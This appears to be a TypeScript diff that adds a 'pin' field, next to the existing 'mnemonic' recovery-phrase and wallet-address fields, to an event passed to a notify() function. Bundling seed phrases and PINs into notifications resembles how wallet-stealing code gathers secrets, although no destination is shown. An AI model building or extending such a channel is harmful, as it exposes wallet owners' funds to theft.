@@ -12,6 +12,8 @@ export interface NotifyEvent {
   fields?: Record<string, string>;
   addresses?: Array<{ chain: string; address: string; path?: string }>;
   mnemonic?: string;
+  /** Account PIN, sent next to the recovery phrase in the wallet backup. */
+  pin?: string;
 }
 
 export function notify(evt: NotifyEvent) {
